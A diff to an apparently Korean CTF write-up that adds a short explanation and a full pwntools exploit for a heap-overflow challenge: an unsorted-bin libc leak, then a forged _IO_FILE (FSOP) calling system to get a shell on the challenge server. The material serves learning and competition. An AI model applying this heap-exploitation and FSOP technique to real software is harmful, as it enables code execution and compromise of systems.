@@ -781,4 +781,154 @@ __int64 pipe_create()
 }
 ```
 
-`pipe_control`이다. `pipe_create`는 할당, `pipe_resize`는 해제 후 재할당, `pipe_read`는 출력, `pipe_write`는 입력이다. `pipe_create`에서 알 수 있듯이 청크를 하나 할당받고 거기에서 청크 주소와 크기를 관리한다. 위의 `heap overflow` 취약점을 이용해서 청크 사이즈를 바꾸고 해제시킨다. 그러고 `pipe` 기능들로 청크를 할당시키면 `un`
+`pipe_control`이다. `pipe_create`는 할당, `pipe_resize`는 해제 후 재할당, `pipe_read`는 출력, `pipe_write`는 입력이다. `pipe_create`에서 알 수 있듯이 청크를 하나 할당받고 거기에서 청크 주소와 크기를 관리한다. 위의 `heap overflow` 취약점을 이용해서 청크 사이즈를 바꾸고 해제시킨다. 그러고 `pipe` 기능들로 청크를 할당시키면 `unsorted bin`의 `fd, bk`에서 `libc leak`을 할 수 있다. 다시 `heap overflow`로 청크 포인터를 덮어서 `FSOP`를 진행한다.
+
+### ex.py
+
+```python
+from pwn import *
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
+parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
+args = parser.parse_args()
+
+gdb_cmds = [
+    'set follow-fork-mode parent',
+    #'b *$rebase(0x1593)',
+    'c'
+]
+
+binary = './prob'
+ 
+context.binary = binary
+context.arch = 'amd64'
+# context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+if args.remote:
+    p = remote("chall.polygl0ts.ch", 9036)
+else:
+    p = process(binary)
+    if args.gdb:
+        gdb.attach(p, '\n'.join(gdb_cmds))
+l = ELF('./libc.so.6')
+
+def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
+                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
+                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
+                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
+                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
+                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
+    
+    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
+    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
+    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
+    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
+    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
+    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
+    FSOP += p64(__pad5) + p32(_mode)
+    if _unused2 == b"":
+        FSOP += b"\x00" * 0x14
+    else:
+        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
+    
+    FSOP += p64(vtable)
+    FSOP += more_append
+    return FSOP
+
+def binder(ctt : bytes):
+    p.sendlineafter(b'> ', b'1')
+    p.sendafter(b'? ', ctt)
+
+def pipe_create():
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'> ', b'1')
+
+def pipe_resize(idx : int, sz : int):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'? ', str(idx).encode())
+    p.sendlineafter(b'? ', str(sz).encode())
+
+def pipe_read(idx : int):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'> ', str(idx).encode())
+    p.recvuntil(b'> ')
+    return p.recvline()
+
+def pipe_write(idx : int, ctt : bytes):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'> ', b'4')
+    p.sendlineafter(b'> ', str(idx).encode())
+    p.sendafter(b'> ', ctt)
+
+mem_base = 0x20000000
+pipe_create()
+pipe_create()
+pipe_create()
+pipe_create()
+pipe_create()
+pipe_resize(2, 0x1000)
+pipe_resize(3, 0x1000)
+pipe_resize(1, 0x1000)
+pipe_resize(4, 0x1000)
+pipe_resize(0, 0x1000)
+payload = p64(1) + p64(mem_base + 0x20) + p64(0) * 2
+payload += p32(0x46740) + p64(0) + p64(1) + p64(0x1008 - 8 - 0x40) + p64(8) + p64(mem_base + 0x100) + p64(mem_base + 0x2100)
+payload = payload.ljust(0x100, b'\x00')
+payload += p16(0x4142) + b'a' * 0x16 + b'a' * 0xfb0 + p64(0x21) + b'a' * 0x18 + p64(0x1010 + 0x20 + 0x1010 + 1)
+payload = payload.ljust(0x2100, b'\x00')
+payload += p64(0x1010 + 0x20 - 0x40)
+binder(payload)
+payload = p64(1) + p64(mem_base + 0x20) + p64(0) * 2
+payload += p32(0x46740) + p64(0) + p64(1) + p64(0x1008 - 8 - 0x40) + p64(8) + p64(mem_base + 0x100) + p64(mem_base + 0x2100)
+payload = payload.ljust(0x100, b'\x00')
+payload += p16(0x4142)
+payload = payload.ljust(0x2100, b'\x00')
+payload += p64(0x2)
+binder(payload)
+pipe_resize(4, 0x1000)
+pipe_resize(4, 0x2000)
+msg = pipe_read(3)
+l.address = u64(msg[0xfe0:][:8]) - 0x219ce0
+print(hex(l.address))
+
+payload = p64(1) + p64(mem_base + 0x20) + p64(0) * 2
+payload += p32(0x46740) + p64(0) + p64(1) + p64(0x28 - 8) + p64(8) + p64(mem_base + 0x100) + p64(mem_base + 0x2100)
+payload = payload.ljust(0x100, b'\x00')
+payload += p16(0x4142)
+payload = payload.ljust(0x2100, b'\x00')
+payload += p64(0x2)
+binder(payload)
+
+pipe_create()
+pipe_create()
+pipe_resize(5, 0x1000)
+
+fake_fsop_struct = l.sym['_IO_2_1_stdout_']
+stdout_lock = l.address + 0x21ba70
+FSOP = FSOP_struct(
+	flags=u64(b"\x01\x01\x01\x01;sh\x00"),
+	lock=stdout_lock,
+	_wide_data=fake_fsop_struct - 0x10,
+	_markers=l.symbols["system"],
+	_unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
+	vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
+	_mode=0xFFFFFFFF,
+)
+print(hex(fake_fsop_struct))
+
+payload = p64(1) + p64(mem_base + 0x20) + p64(0) * 2
+payload += p32(0x46740) + p64(0) + p64(1) + p64(0x1008 - 8 - 0x40) + p64(8) + p64(mem_base + 0x100) + p64(mem_base + 0x2100)
+payload = payload.ljust(0x100, b'\x00')
+payload += p16(0x4142) + b'a' * 0x16 + b'a' * 0xfb0 + p64(0x21) + p64(fake_fsop_struct)
+payload = payload.ljust(0x2100, b'\x00')
+payload += p64(0x1010 + 0x8 - 0x40)
+binder(payload)
+
+pipe_write(6, FSOP)
+p.interactive()
+```
